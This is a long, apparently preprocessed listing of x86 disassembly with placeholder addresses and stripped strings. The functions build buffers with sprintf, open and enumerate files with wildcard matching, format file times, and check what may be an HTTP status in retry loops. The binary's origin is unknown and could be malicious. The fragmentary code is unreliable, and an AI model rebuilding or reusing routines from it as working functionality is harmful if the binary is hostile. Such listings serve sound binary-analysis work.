cmp [ ebp - 0xc ] 0x14
jge r-xdata
push [ ebp - 0x8 ]
call free
pop ecx
push ebx
call free
pop ecx
mov edi rw-data
push edi
push esi
call strstr
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
mov eax [ ebp - 0x10 ]
and [ ebp - 0x1c ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
fild [ ebp - 0x20 ]
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x20 ] ecx
push ecx
push eax
fmul [ r--data ]
fild [ ebp - 0x20 ]
push ecx
push ecx
lea eax [ ebp - 0x1c0 ]
fdivp st1
fstp [ esp ]
push [ ebp + 0x8 ]
push rw-data
push eax
call sprintf
add esp 0x1c
jmp r-xdata
push [ ebp + 0x10 ]
mov eax [ ebp - 0x10 ]
xor edx edx
push eax
imul eax eax 0x64
div [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
push rw-data
jmp r-xdata
push rw-data
push ebx
call strstr
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x1c0 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call sprintf
add esp 0x10
push edi
call strlen
add esi eax
pop ecx
cmp [ esi ] 0x0
lea eax [ esi + 0x1 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c0 ]
push eax
call sprintf
lea eax [ ebp - 0x1c0 ]
push eax
call _strdup
add esp 0x1c
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push rw-data
call strlen
add ebx eax
pop ecx
cmp [ ebx ] 0x0
lea eax [ ebx + 0x1 ]
je r-xdata
lea eax [ ebp - 0x1c0 ]
push eax
call _strdup
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call free
pop ecx
push esi
call strlen
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_40c89c
push [ ebp - 0x14 ]
mov esi eax
push esi
call sub_40267e
push 0x6
push rw-data
push esi
call strncmp
add esp 0x20
test eax eax
jne r-xdata
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
and [ ebp - 0x38 ] 0x0
shl eax 0xa
add [ ebp - 0x10 ] eax
sub [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x10 ]
add [ ebp + 0xc ] eax
mov eax [ ebp + 0x10 ]
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x20 ] eax
fild [ ebp - 0x3c ]
push [ ebp + 0x14 ]
fmul [ r--data ]
fild [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c0 ]
push [ ebp - 0x10 ]
fdivp st1
push ecx
push ecx
fstp [ esp ]
push [ ebp + 0x8 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x1c0 ]
push eax
call strlen
mov ebx eax
lea eax [ ebp - 0x1c0 ]
push ebx
push eax
call sub_40267e
lea eax [ ebp - 0x1c0 ]
push ebx
push eax
call sub_40c768
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call strlen
push [ ebp - 0x4 ]
mov ebx eax
call strlen
push edi
add ebx eax
call strlen
add esp 0x40
add ebx eax
push esi
call strlen
lea ebx [ ebx + eax + 0x6 ]
push ebx
call malloc
push ebx
push 0x0
push eax
mov [ ebp - 0x8 ] eax
call memset
push [ ebp - 0x4 ]
push edi
push esi
push [ rw-data ]
push rw-data
push ebx
push [ ebp - 0x8 ]
call _snprintf
add esp 0x30
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call free
pop ecx
push ebx
call strlen
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
push ebx
call sub_40c89c
push [ ebp - 0x14 ]
mov ebx eax
push ebx
call sub_40267e
push 0x6
push rw-data
push ebx
call strncmp
add esp 0x20
test eax eax
je r-xdata
cmp [ eax ] 0x20
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c0 ]
push rw-data
push eax
call sprintf
add esp 0xc
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
and [ eax ] 0x0
and [ ebp - 0xc ] 0x0
push [ ebp - 0x4 ]
call free
pop ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
and [ eax ] 0x0
cmp [ rw-data ] 0xc8
je r-xdata
push ebx
call strlen
cmp eax 0xa
pop ecx
jbe r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x11c0 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x11c0 ]
push eax
call _strdup
add esp 0x10
jmp r-xdata
push [ ebp - 0x4 ]
call free
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x14
jl r-xdata
push [ ebp - 0x4 ]
call free
pop ecx
push rw-data
push ebx
call strstr
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
cmp [ ebp - 0xc ] 0x14
jge r-xdata
push [ ebp - 0x8 ]
call free
pop ecx
mov eax [ rw-data ]
push 0x2
push [ rw-data ]
shl eax 0x6
add eax rw-data
push eax
push [ ebp - 0x8 ]
push rw-data
call sub_402b19
mov ebx eax
add esp 0x14
test ebx ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
push rw-data
call strlen
add ebx eax
pop ecx
cmp [ ebx ] 0x0
lea eax [ ebx + 0x1 ]
je r-xdata
push [ ebp + 0x10 ]
mov eax [ ebp - 0x10 ]
xor edx edx
push eax
imul eax eax 0x64
div [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
push rw-data
mov eax [ rw-data ]
shl eax 0xa
cmp [ ebp - 0x18 ] eax
ja r-xdata
push ebx
call strlen
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
push ebx
call sub_40c89c
push [ ebp - 0x14 ]
mov ebx eax
push ebx
call sub_40267e
push 0x6
push rw-data
push ebx
call strncmp
add esp 0x20
test eax eax
je r-xdata
cmp [ eax ] 0x20
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
and [ eax ] 0x0
push [ ebp - 0x8 ]
call free
pop ecx
sub_40a25b
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call _strdup
mov esi eax
push esi
call strlen
mov edi eax
push edi
push esi
call sub_40267e
push edi
push esi
call sub_40c768
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call strlen
push [ ebp - 0x4 ]
mov ebx eax
call strlen
mov edi rw-data
add ebx eax
push edi
call strlen
mov esi rw-data
add ebx eax
push esi
call strlen
lea ebx [ ebx + eax + 0x6 ]
push ebx
call malloc
push ebx
push 0x0
push eax
mov [ ebp - 0x8 ] eax
call memset
push [ ebp - 0x4 ]
push edi
push esi
push [ rw-data ]
push rw-data
push ebx
mov ebx [ ebp - 0x8 ]
push ebx
call _snprintf
add esp 0x54
cmp [ ebp - 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov edi rw-data
push [ ebp - 0x4 ]
call free
pop ecx
cmp [ rw-data ] 0xc8
je r-xdata
push esi
call strlen
cmp eax 0xa
pop ecx
jbe r-xdata
test ebx ebx
je r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x14
jl r-xdata
push [ ebp - 0x8 ]
call free
pop ecx
push edi
push esi
call strstr
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
cmp [ ebp - 0x4 ] 0x14
push [ ebp + 0x8 ]
jl r-xdata
push ebx
call free
pop ecx
mov eax [ rw-data ]
push 0x2
push [ rw-data ]
shl eax 0x6
add eax rw-data
push eax
push ebx
push rw-data
call sub_402b19
mov esi eax
add esp 0x14
test esi esi
mov [ ebp - 0x8 ] esi
je r-xdata
push edi
call strlen
add esi eax
pop ecx
cmp [ esi ] 0x0
lea eax [ esi + 0x1 ]
je r-xdata
push rw-data
push rw-data
jmp r-xdata
push esi
call strlen
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
push esi
call sub_40c89c
push [ ebp - 0xc ]
mov esi eax
push esi
call sub_40267e
push 0x6
push rw-data
push esi
call strncmp
add esp 0x20
test eax eax
je r-xdata
cmp [ eax ] 0x20
jne r-xdata
lea eax [ ebp - 0x40c ]
push eax
call sprintf
lea eax [ ebp - 0x40c ]
push eax
call _strdup
add esp 0x10
pop edi
pop esi
pop ebx
leave
retn
test ebx ebx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
and [ eax ] 0x0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push ebx
call free
pop ecx
push [ ebp + 0x8 ]
push rw-data
jmp r-xdata
push [ ebp - 0x8 ]
call free
pop ecx
sub_40a424
push ebp
mov ebp esp
push ecx
push esi
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] edi
call _strdup
push eax
call _strlwr
push [ ebp + 0xc ]
mov esi eax
mov [ ebp + 0x8 ] esi
call _strdup
push eax
call _strlwr
add esp 0x10
mov [ ebp + 0xc ] eax
inc esi
jmp r-xdata
cmp cl 0x9
jne r-xdata
mov cl [ esi ]
cmp cl 0x20
je r-xdata
mov cl [ eax ]
cmp cl 0x20
je r-xdata
inc eax
jmp r-xdata
cmp cl 0x9
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
mov dl [ esi ]
cmp dl 0x2a
je r-xdata
cmp [ esi ] 0x2a
jne r-xdata
mov dl [ esi ]
cmp dl 0x2a
jne r-xdata
cmp dl cl
je r-xdata
xor eax eax
cmp [ esi ] al
sete al
mov esi eax
inc esi
jmp r-xdata
cmp dl cl
je r-xdata
inc esi
cmp [ esi ] 0x0
je r-xdata
inc esi
inc eax
jmp r-xdata
cmp dl 0x3f
jne r-xdata
inc esi
inc eax
jmp r-xdata
cmp dl 0x3f
je r-xdata
push 0x1
pop esi
jmp r-xdata
mov [ ebp - 0x4 ] esi
lea edi [ eax + 0x1 ]
jmp r-xdata
xor esi esi
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov eax edi
inc edi
jmp r-xdata
push [ ebp + 0x8 ]
call free
push [ ebp + 0xc ]
call free
pop ecx
mov eax esi
pop ecx
pop edi
pop esi
leave
retn
sub_40a4f0
push ebp
mov ebp esp
sub esp 0x688
push ebx
push esi
push edi
push 0x184
call malloc
mov ebx eax
xor esi esi
cmp ebx esi
pop ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x688 ]
push eax
call _strdup
add esp 0xc
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
cmp cl 0x20
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x288 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x288 ]
push rw-data
push eax
call sprintf
add esp 0xc
jmp r-xdata
inc eax
jmp r-xdata
push [ rw-data ]
lea eax [ ebp - 0x44 ]
push rw-data
push rw-data
push eax
call sprintf
add esp 0x10
lea eax [ ebp - 0x44 ]
push esi
push esi
push 0x3
push esi
push 0x3
push 0x80000000
push eax
call [ CreateFileA@IAT ]
push eax
call sub_408bb6
mov eax [ rw-data ]
mov [ esp ] 0x200
imul eax eax 0x1c
push [ eax + rw-data ]
call sub_408bc7
pop ecx
pop ecx
call sub_408bda
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x288 ]
push eax
push rw-data
push ebx
call sprintf
push 0xffffffff
lea eax [ ebp - 0x688 ]
push 0x400
push eax
mov [ rw-data ] esi
call sub_409330
add esp 0x18
test eax eax
je r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
push eax
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x184 ]
mov [ ebp - 0x4 ] esi
push eax
push esi
call sub_40912d
pop ecx
mov edi rw-data
pop ecx
cmp [ ebp + 0x8 ] esi
je r-xdata
cmp ebx esi
je r-xdata
push [ ebp + 0x8 ]
call free
pop ecx
push [ ebp - 0x4 ]
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x688 ]
push eax
push ebx
call strcat
push ebx
call strlen
add esp 0x18
cmp eax 0x400
push ebx
jbe r-xdata
cmp esi 0x1a
jle r-xdata
lea eax [ ebp - 0x688 ]
push eax
call _strdup
pop ecx
push ebx
call free
pop ecx
call _strdup
pop ecx
call strlen
push eax
lea eax [ ebp - 0x288 ]
push eax
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x688 ]
push eax
call sub_40a25b
mov esi eax
push 0x6
push edi
push esi
mov [ ebp + 0x8 ] esi
call strncmp
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x184 ]
inc esi
push eax
push esi
call sub_40912d
pop ecx
pop ecx
jmp r-xdata
test eax eax
jne r-xdata
lea eax [ ebp - 0x288 ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call free
pop ecx
push esi
push 0x4
push rw-data
push esi
call strncmp
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x12
je r-xdata
cmp [ ebp - 0x4c ] 0x1
je r-xdata
test ebx ebx
je r-xdata
lea eax [ ebp - 0x288 ]
push eax
call free
pop ecx
mov eax [ rw-data ]
inc [ rw-data ]
push eax
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
push ebx
call strlen
add eax 0x82
push eax
call malloc
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov eax esi
mov ecx 0x1388
cdq
idiv ecx
imul eax eax 0x1388
cmp esi eax
jne r-xdata
cmp [ ebp - 0x5c ] 0x10000000
je r-xdata
mov eax edi
jmp r-xdata
push ebx
call free
pop ecx
push 0x1
push ebx
call strlen
pop ecx
push eax
lea eax [ ebp - 0x688 ]
push ebx
push eax
call sub_409a84
add esp 0x10
jmp r-xdata
push rw-data
push esi
call sprintf
push ebx
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x18
push 0x1
push esi
call strlen
pop ecx
push eax
lea eax [ ebp - 0x688 ]
push esi
push eax
call sub_409a84
push esi
mov edi eax
call free
add esp 0x14
jmp r-xdata
push esi
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x688 ]
push eax
call sub_40a25b
push 0x6
push edi
push eax
mov [ ebp + 0x8 ] eax
call strncmp
add esp 0x1c
test eax eax
je r-xdata
cmp [ ebp - 0x5c ] 0x2820
je r-xdata
mov edi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x6
push edi
push [ ebp + 0x8 ]
call strncmp
add esp 0xc
test eax eax
je r-xdata
push 0x4
push rw-data
push [ ebp + 0x8 ]
call strncmp
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x184 ]
push eax
call strlen
test eax eax
pop ecx
jbe r-xdata
push [ ebp + 0x8 ]
push rw-data
jmp r-xdata
push 0x4
push rw-data
push [ ebp + 0x8 ]
call strncmp
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x184 ]
push eax
lea eax [ ebp - 0x288 ]
push eax
call sub_40a424
pop ecx
cmp eax 0x1
pop ecx
jne r-xdata
lea eax [ ebp - 0x688 ]
push eax
call sprintf
add esp 0xc
xor esi esi
jmp r-xdata
push 0x0
push rw-data
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x68 ]
mov ecx eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
sar ecx 0x1f
push eax
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call [ FileTimeToSystemTime@IAT ]
lea eax [ ebp - 0x184 ]
push eax
movzx eax [ ebp - 0x8 ]
push [ ebp - 0x54 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x14 ]
push eax
push esi
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x688 ]
push eax
push ebx
call strcat
inc [ ebp - 0x4 ]
push ebx
call strlen
add eax 0x185
push eax
push ebx
call realloc
mov ebx eax
add esp 0x40
test ebx ebx
je r-xdata
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
sub_40a9bc
push ebp
mov ebp esp
sub esp 0x688
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
cmp cl 0x20
jne r-xdata
lea eax [ ebp - 0x288 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x288 ]
push rw-data
push eax
call sprintf
add esp 0xc
jmp r-xdata
inc eax
jmp r-xdata
push [ rw-data ]
lea eax [ ebp - 0x44 ]
push rw-data
push rw-data
push eax
call sprintf
add esp 0x10
lea eax [ ebp - 0x44 ]
push esi
push esi
push 0x3
push esi
push 0x3
push 0x80000000
push eax
call [ CreateFileA@IAT ]
push eax
call sub_408bb6
mov eax [ rw-data ]
mov [ esp ] 0x200
imul eax eax 0x1c
push [ eax + rw-data ]
call sub_408bc7
pop ecx
pop ecx
call sub_408bda
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
jmp r-xdata
push ebx
push esi
push edi
push 0xffffffff
lea eax [ ebp - 0x688 ]
xor esi esi
push 0x400
push eax
mov [ rw-data ] esi
call sub_409330
add esp 0xc
test eax eax
je r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
push eax
push rw-data
lea ecx [ ebp - 0x184 ]
xor eax eax
push ecx
push eax
xor ebx ebx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xc ] esi
xor edi edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] eax
call sub_40912d
pop ecx
cmp eax 0x12
pop ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
lea eax [ ebp - 0x688 ]
push eax
call _strdup
pop ecx
leave
retn
push [ ebp + 0x8 ]
call free
pop ecx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] 0x1
inc [ ebp - 0x8 ]
lea eax [ ebp - 0x184 ]
push eax
push [ ebp - 0x8 ]
call sub_40912d
pop ecx
cmp eax 0x12
pop ecx
jne r-xdata
cmp [ ebp - 0x4c ] 0x1
je r-xdata
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
test ecx ecx
jle r-xdata
cmp [ ebp - 0x5c ] 0x10000000
je r-xdata
lea eax [ ebx + esi ]
add eax [ ebp - 0x10 ]
add eax [ ebp - 0x4 ]
add eax [ ebp - 0xc ]
add eax edi
add ecx eax
push ecx
push esi
push ebx
push [ ebp - 0x10 ]
push edi
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x288 ]
push eax
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
add esp 0x2c
jmp r-xdata
lea eax [ ebx + esi ]
add eax [ ebp - 0x10 ]
add eax [ ebp - 0x4 ]
add eax [ ebp - 0xc ]
add eax edi
lea edx [ eax + ecx ]
push edx
push esi
push ebx
push [ ebp - 0x10 ]
push edi
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x288 ]
push ecx
push eax
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
add esp 0x30
jmp r-xdata
cmp [ ebp - 0x5c ] 0x2820
je r-xdata
lea eax [ ebp - 0x184 ]
push eax
call strlen
test eax eax
pop ecx
jbe r-xdata
lea eax [ ebp - 0x184 ]
push eax
lea eax [ ebp - 0x288 ]
push eax
call sub_40a424
pop ecx
cmp eax 0x1
pop ecx
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x8 ]
call sub_408e60
add esp 0xc
mov [ ebp - 0x24 ] eax
test eax eax
jne r-xdata
inc esi
cmp [ rw-data ] 0x1
jne r-xdata
push [ ebp - 0x1c ]
call ??3@YAXPAX@Z
and [ ebp - 0x1c ] 0x0
pop ecx
cmp [ rw-data ] 0x1
jne r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
inc [ ebp - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x20 ] 0x1f400000
jbe r-xdata
inc ebx
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
inc edi
jmp r-xdata
push [ ebp - 0x18 ]
lea eax [ ebp - 0x184 ]
push [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x688 ]
push [ ebp - 0x8 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x688 ]
push eax
call sub_40a25b
push 0x6
push rw-data
push eax
mov [ ebp + 0x8 ] eax
call strncmp
add esp 0x28
test eax eax
je r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
push 0x6
push rw-data
push [ ebp + 0x8 ]
call strncmp
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x57
push 0x12
push 0xc
lea eax [ ebp - 0x688 ]
push [ ebp - 0x24 ]
push rw-data
push eax
call sprintf
add esp 0x18
jmp r-xdata
push [ ebp - 0x14 ]
push rw-data
jmp r-xdata
lea eax [ ebp - 0x184 ]
push eax
lea eax [ ebp - 0x688 ]
push [ ebp - 0x8 ]
push rw-data
push eax
call sprintf
push [ ebp - 0x18 ]
lea eax [ ebp - 0x688 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push eax
call sub_409a84
push 0x6
push rw-data
push eax
mov [ ebp + 0x8 ] eax
call strncmp
add esp 0x2c
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call free
pop ecx
lea eax [ ebp - 0x688 ]
push eax
call sprintf
add esp 0xc
push 0x4
push rw-data
push [ ebp + 0x8 ]
call strncmp
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x18 ]
inc esi
jmp r-xdata
push [ ebp + 0x8 ]
call free
pop ecx
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_40ad9f
push ebp
mov ebp esp
sub esp 0x68c
push ebx
push esi
push edi
push 0x304
call malloc
mov ebx eax
xor esi esi
cmp ebx esi
pop ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
lea eax [ ebp - 0x588 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x588 ]
push eax
call _strdup
add esp 0xc
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
cmp cl 0x20
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x68c ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x68c ]
push rw-data
push eax
call sprintf
add esp 0xc
jmp r-xdata
inc eax
jmp r-xdata
push [ rw-data ]
lea eax [ ebp - 0x48 ]
push rw-data
push rw-data
push eax
call sprintf
add esp 0x10
lea eax [ ebp - 0x48 ]
push esi
push esi
push 0x3
push esi
push 0x3
push 0x80000000
push eax
call [ CreateFileA@IAT ]
push eax
call sub_408bb6
mov eax [ rw-data ]
mov [ esp ] 0x200
imul eax eax 0x1c
push [ eax + rw-data ]
call sub_408bc7
pop ecx
pop ecx
call sub_408bda
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x588 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x68c ]
push eax
push rw-data
push ebx
call sprintf
push 0xffffffff
lea eax [ ebp - 0x588 ]
push 0x400
push eax
mov [ rw-data ] esi
call sub_409330
add esp 0x18
test eax eax
je r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
push eax
push rw-data
lea eax [ ebp - 0x188 ]
mov [ ebp - 0x28 ] esi
push eax
push esi
mov [ ebp - 0x4 ] esi
call sub_408f36
pop ecx
cmp eax 0x12
pop ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
push [ ebp + 0x8 ]
call free
pop ecx
push [ ebp - 0x28 ]
lea eax [ ebp - 0x588 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x588 ]
push eax
push ebx
call strcat
push ebx
call strlen
add esp 0x18
cmp eax 0x400
push ebx
jbe r-xdata
mov esi [ FileTimeToLocalFileTime@IAT ]
mov edi [ FileTimeToSystemTime@IAT ]
lea eax [ ebp - 0x588 ]
push eax
call _strdup
pop ecx
push ebx
call free
pop ecx
call _strdup
pop ecx
call strlen
push eax
lea eax [ ebp - 0x68c ]
push eax
lea eax [ ebp - 0x588 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x588 ]
push eax
call sub_40a25b
mov esi eax
push 0x6
push rw-data
push esi
mov [ ebp + 0x8 ] esi
call strncmp
add esp 0x24
test eax eax
je r-xdata
inc [ ebp - 0x4 ]
lea eax [ ebp - 0x188 ]
push eax
push [ ebp - 0x4 ]
call sub_408f36
pop ecx
cmp eax 0x12
pop ecx
jne r-xdata
cmp [ ebp - 0x50 ] 0x1
jne r-xdata
lea eax [ ebp - 0x68c ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call free
pop ecx
push esi
push 0x4
push rw-data
push esi
call strncmp
add esp 0xc
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx 0x1388
cdq
idiv ecx
imul eax eax 0x1388
cmp [ ebp - 0x4 ] eax
jne r-xdata
cmp [ ebp - 0x60 ] 0x10000000
je r-xdata
test ebx ebx
je r-xdata
lea eax [ ebp - 0x68c ]
push eax
call free
pop ecx
mov eax [ rw-data ]
inc [ rw-data ]
push eax
lea eax [ ebp - 0x588 ]
push rw-data
push eax
call sprintf
push ebx
call strlen
add eax 0x82
push eax
call malloc
mov esi eax
add esp 0x14
test esi esi
je r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x588 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x588 ]
push eax
call sub_40a25b
push 0x6
push rw-data
push eax
mov [ ebp + 0x8 ] eax
call strncmp
add esp 0x1c
test eax eax
je r-xdata
cmp [ ebp - 0x60 ] 0x2820
je r-xdata
mov eax edi
jmp r-xdata
push ebx
call free
pop ecx
push 0x1
push ebx
call strlen
pop ecx
push eax
lea eax [ ebp - 0x588 ]
push ebx
push eax
call sub_409a84
add esp 0x10
jmp r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
push 0x6
push rw-data
push [ ebp + 0x8 ]
call strncmp
add esp 0xc
test eax eax
je r-xdata
push 0x4
push rw-data
push [ ebp + 0x8 ]
call strncmp
add esp 0xc
test eax eax
je r-xdata
push 0x11
lea eax [ ebp - 0x188 ]
push rw-data
push eax
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov edi eax
push rw-data
push rw-data
jmp r-xdata
push [ ebp + 0x8 ]
push rw-data
jmp r-xdata
push 0x4
push rw-data
push [ ebp + 0x8 ]
call strncmp
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x188 ]
push eax
lea eax [ ebp - 0x68c ]
push eax
call sub_40a424
pop ecx
cmp eax 0x1
pop ecx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push esi
call sprintf
pop ecx
pop ecx
push ebx
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x10
push 0x1
push esi
call strlen
pop ecx
push eax
lea eax [ ebp - 0x588 ]
push esi
push eax
call sub_409a84
push esi
mov edi eax
call free
add esp 0x14
jmp r-xdata
lea eax [ ebp - 0x588 ]
push eax
call sprintf
add esp 0xc
push 0x0
push rw-data
jmp r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x588 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x588 ]
push eax
push ebx
call strcat
mov eax [ ebp - 0x70 ]
add esp 0x14
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x6c ]
mov ecx eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
sar ecx 0x1f
push eax
call esi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call edi
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x588 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x588 ]
push eax
push ebx
call strcat
mov eax [ ebp - 0x80 ]
add esp 0x28
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x7c ]
mov ecx eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
sar ecx 0x1f
push eax
call esi
lea eax [ ebp - 0x14 ]
push eax
